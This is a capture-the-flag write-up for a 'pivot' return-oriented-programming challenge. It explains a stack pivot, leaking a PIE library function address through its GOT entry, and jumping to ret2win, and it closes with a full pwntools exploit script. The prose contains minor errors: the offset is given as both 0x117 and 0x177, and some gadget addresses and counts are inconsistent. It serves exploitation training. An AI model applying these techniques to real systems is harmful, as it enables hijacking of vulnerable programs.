## Pivot
### Writeup
#### General Analysis
The idea for this challenge is to ‘pivot’ your stack space elsewhere, as the original space where you perform a stack smash is limited on space, restricting your ability to chain a useful amount of gadgets together. To achieve this, we need gadgets to control the stack pointer (%rsp).

The binary provided takes in user input on two separate occasions. The first reads 256 bytes into a separate random location, which gets ‘leaked’ by the binary’s normal execution flow. The second read, reads 64 bytes, writing over the return address after 40 bytes – this read is where you perform the stack smash. Considering the buffer size, we can see that the second read allows us to use 24 bytes (3 gadgets), compared to 256 bytes (32 gadgets) 

So whatever chain we need to call ret2win() should ideally be stored in the 256 bytes, and we simply use the 24 bytes to pivot there.

#### Hurdles
Whilst it is tempting to just jump straight to the ret2win function, note that the libpivot.so file has PIE enabled! This means that we cannot hardcode any jumps :(

So what do we do? We are going to take advantage of a weakness in PIE.

PIE randomises where a library is in memory as a whole, meaning it doesn’t randomise the addresses of the functions within the library individually. This means that if we can leak the address of any function in the library during runtime, the offset from that function to any other function will be the same as that which is calculated in our static analysis.

Using a hint provided from the challenge description, we know that we need to call ret2win() by first finding where foothold_function() is in memory, then adding an offset to that. Let’s calculate that offset below.

> offset = 0x00000a81 (ret2win in lib) − 0x0000096a (foothold_function) = 0x117 

The last general hurdle we have is that the actual address of foothold_function needs to be resolved first before we can leak it, since the library is dynamically linked. This means that our payload has to call the function first to resolve it before being able to obtain the actual address of the function.

#### Gameplan/Building Payload
1) Our second payload should change stack location after performing a stack smash.

Luckily there are some useful gadgets under the label ‘useful gadgets’, one of which is:

> 0x004009bd xchg rsp, rax; ret

This gadget swaps the values in %rsp and %rax. Another ‘useful gadget’ is:

> 0x04009bb pop rax ; ret

This means that our 3 gadget payload after the 40 byte stack smash should be: 
> pop rax; ret + address of ‘leaked’ new stack address + swap %rsp and %rax

2) Our first payload needs to first call foothold_function, then obtain the resolved address somehow, then use that to jump to ret2win.

Looking under ‘useful gadgets’ again, we can see that we have: 

> 0x004009c4 add rax, rbp; ret\
> 0x004009c4 mov rax, qword [rax]; ret

These gadgets suggest that our approach should be to store the address of foothold_function() in %rax, then add the offset to that using %rbp, before using %rax to jump to ret2win().

To perform this we would ideally need a jmp rax gadget and a pop rbp. Luckily we have exactly those gadgets, as found through: 
```
ROPgadget --binary=./pivot | grep ': jmp rax' && ROPgadget --binary=./pivot | grep ': pop rbp ; ret' 
0x00000000004007c1 : jmp rax 
0x00000000004007c8 : pop rbp ; ret
```

Working backwards, this means our payload idea thus far is: load &foothold_function in %rax, add offset 0x117 to %rax through %rbp, jmp rax. The only obstacle remaining is putting the address in %rax in the first place. This is the foothold_function .plt entry back in ./pivot…

```
6: foothold_function ();
0x00400720      jmp      qword [reloc.foothold_function] ; 0x601040
0x00400726      push     5    ; 5
0x0040072b      jmp      section..plt
```

The value at 0x601040 (reloc.foothold_function) at the start of execution is 0x00400726, which is the push 5 instruction. The idea here is that after the first function call, hence resolving the function because of dynamic linking, the value at 0x60140 will be the actual address of foothold_function().

This means that our final payload would be:

> call foothold_function() + pop rax + &reloc.foothold_function + load [rax] into rax + pop rbp + 0x177 (offset) + add rbp to rax + jmp rax

### Exploit
```
#!/bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./pivot")
libelf = ELF("./libpivot.so")
p = elf.process()

foothold_function_plt = 0x00400720
foothold_function_got = 0x00601040 # dereference for address
ret2win_offset = 0x00000a81 - 0x0000096a # 0x117

xchg = 0x004009bd # xchg rsp, rax; ret <- this swaps the values in the registers
pop_rax = 0x00000000004009bb # pop rax ; ret
load_rax = 0x00000000004009c0 # mov rax, qword ptr [rax] ; ret
add_to_rax = 0x00000000004009c4 # add rax, rbp ; ret
pop_rbp = 0x00000000004007c8 # pop rbp ; ret
jmp_rax = 0x00000000004007c1 # jmp rax

# first get address of where to pivot to
pivot_location = [word for word in p.recvuntil(b"> ").split() if word.startswith(b"0x")][0].decode()
# print("[*] PLACED RSP AT " + pivot_location)
pivot_stack = int(pivot_location, 16)

second_payload = [ # first chain to execute, max: 3 gadgets 
    # call foothold_function for first time to populate .got entry
    pop_rax,
    pivot_stack,
    xchg 
]

first_payload = [ # second chain to execute, max: 64 gadgets 
    foothold_function_plt,
    pop_rax,
    foothold_function_got, # true address now is loaded 
    load_rax,
    pop_rbp,
    ret2win_offset,
    add_to_rax,
    jmp_rax
]

first_payload = b"".join([p64(address) for address in first_payload])
second_payload = b"A" * 40 + b"".join([p64(address) for address in second_payload])

# now you can launch the payload fully
p.sendline(first_payload)
o = p.recvuntil(b"> ")
p.sendline(second_payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```